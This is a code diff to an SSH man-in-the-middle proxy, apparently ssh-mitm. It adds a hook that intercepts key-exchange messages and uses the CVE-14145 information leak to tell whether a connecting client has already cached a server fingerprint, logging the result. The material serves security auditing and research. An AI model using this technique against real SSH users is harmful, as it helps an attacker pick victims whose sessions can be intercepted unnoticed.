@@ -1,13 +1,22 @@
 import logging
+import re
 import threading
 
-from paramiko import Transport, AUTH_SUCCESSFUL
+from paramiko import Transport, AUTH_SUCCESSFUL, common, ECDSAKey
 from paramiko.agent import AgentServerProxy
 
 from ssh_proxy_server.interfaces.server import ProxySFTPServer
 
 
 class Session:
+
+    DEFAULT_HOST_KEY_ALGOS = ['ecdsa-sha2-nistp256-cert-v01@openssh.com', 'ecdsa-sha2-nistp384-cert-v01@openssh.com',
+                              'ecdsa-sha2-nistp521-cert-v01@openssh.com', 'sk-ecdsa-sha2-nistp256-cert-v01@openssh.com',
+                              'ssh-ed25519-cert-v01@openssh.com', 'sk-ssh-ed25519-cert-v01@openssh.com',
+                              'rsa-sha2-512-cert-v01@openssh.com', 'rsa-sha2-256-cert-v01@openssh.com',
+                              'ssh-rsa-cert-v01@openssh.com', 'ecdsa-sha2-nistp256', 'ecdsa-sha2-nistp384',
+                              'ecdsa-sha2-nistp521', 'sk-ecdsa-sha2-nistp256@openssh.com', 'ssh-ed25519',
+                              'sk-ssh-ed25519@openssh.com', 'rsa-sha2-512', 'rsa-sha2-256', 'ssh-rsa']
     CIPHERS = None
 
     def __init__(self, proxyserver, client_socket, client_address, authenticator, remoteaddr):
@@ -54,6 +63,7 @@ class Session:
     def transport(self):
         if not self._transport:
             self._transport = Transport(self.client_socket)
+            self.hookup_cve_14145()
             if self.CIPHERS:
                 if not isinstance(self.CIPHERS, tuple):
                     raise ValueError('ciphers must be a tuple')
@@ -62,6 +72,35 @@ class Session:
             self._transport.set_subsystem_handler('sftp', ProxySFTPServer, self.proxyserver.sftp_interface)
 
         return self._transport
+
+    def hookup_cve_14145(self):
+        # When really trying to implement connection termination/forwarding based on CVE-14145
+        # one should consider that clients who already accepted the fingerprint of the ssh-mitm server
+        # will be connected through on their second connect and will get a changed keys error
+        # (because they have a cached fingerprint and it looks like they need to be connected through)
+        def intercept_key_negotiation(transport, m):
+            # restore intercept, to not disturb re-keying if this significantly alters the connection
+            transport._handler_table[common.MSG_KEXINIT] = Transport._negotiate_keys
+
+            m.get_bytes(16)  # cookie, discarded
+            m.get_list()  # key_algo_list, discarded
+            server_key_algo_list = m.get_list()
+            if server_key_algo_list == self.DEFAULT_HOST_KEY_ALGOS:
+                logging.info("CVE-14145: Client connecting for the FIRST time!")
+            else:
+                logging.info("CVE-14145: Client has a locally cached remote fingerprint! "
+                             "(may be the ssh-mitm fingerprint)")
+            if"openssh" in self.transport.remote_version.lower():
+                if isinstance(self.proxyserver.host_key, ECDSAKey):
+                    logging.warning("CVE-14145: ECDSA-SHA2 Key is a bad choice; this will produce more false positives!")
+                r = re.compile(".*openssh_(\d\.\d).*", re.IGNORECASE)
+                if int(r.match(self.transport.remote_version).group(1).replace(".", "")) > 83:
+                    logging.warning("CVE-14145: Remote OpenSSH Version > 8.3; CVE-14145 might produce false positive!")
+            m.rewind()
+            # normal operation
+            Transport._negotiate_keys(transport, m)
+
+        self.transport._handler_table[common.MSG_KEXINIT] = intercept_key_negotiation
 
     def _start_channels(self):
         # create client or master channel
@@ -117,6 +156,8 @@ class Session:
 
         # wait for authentication
         event.wait()
+
+
 
         if not self.transport.is_active():
             return False
